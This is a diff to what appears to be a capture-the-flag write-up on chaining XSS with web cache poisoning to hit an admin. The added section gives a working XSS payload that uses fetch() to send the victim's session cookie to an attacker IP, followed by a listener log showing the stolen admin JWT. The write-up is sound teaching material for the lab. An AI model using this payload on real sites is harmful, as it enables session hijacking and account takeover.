@@ -521,7 +521,7 @@ Perfect! We received our requests!
 
 <br />
 
-At this point, we have a `XSS` in the website, but `/home` path is not an interesting endpoint to exploit it. We need to find another endpoint where the response is cached, so our payload can be stored in the server and delivered to an important user like an admin.
+At this point, we have a `XSS` in the website, but `/home` path is not an interesting endpoint to exploit it. We need to find another endpoint where the response is cached, so our payload can be cached by the server and served to a privileged user like admin.
 
 If an admin loads the cached payload, we can `hijack` their session by executing malicious `JavaScript` code.
 
@@ -532,3 +532,39 @@ As we had seen before, the `/firewalls` payload is under admin maintenance, so i
 
 
 <br />
+
+In the response we see indicators confirming that the resource is being cached with a `max_age` of 120.
+
+This indicates the response is cached for `120 seconds` by the server
+
+To exfiltrate the admin's `session` cookie, we use the following payload:
+
+<br />
+
+```bash
+"></script><script>fetch("http://10.10.14.13/?cookies="+document.cookie);</script><"
+```
+
+<br />
+
+
+After some seconds, we check our listener and...
+
+<br />
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.33 - - [30/Jun/2025 19:37:25] "GET /?cookies=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzA4NTczfQ.FIHkJ0o7wwVrbAAsFdBMutwRkUBxtFgnzOIvDmgU5FE HTTP/1.1" 200 -
+10.10.11.33 - - [30/Jun/2025 19:37:26] "GET /?cookies=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzA4NTczfQ.FIHkJ0o7wwVrbAAsFdBMutwRkUBxtFgnzOIvDmgU5FE HTTP/1.1" 200 -
+10.10.11.33 - - [30/Jun/2025 19:37:26] "GET /?cookies=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzA4NTczfQ.FIHkJ0o7wwVrbAAsFdBMutwRkUBxtFgnzOIvDmgU5FE HTTP/1.1" 200 -
+```
+
+<br />
+
+We successfully retrieved the admin's session token.
+
+
+
+
+
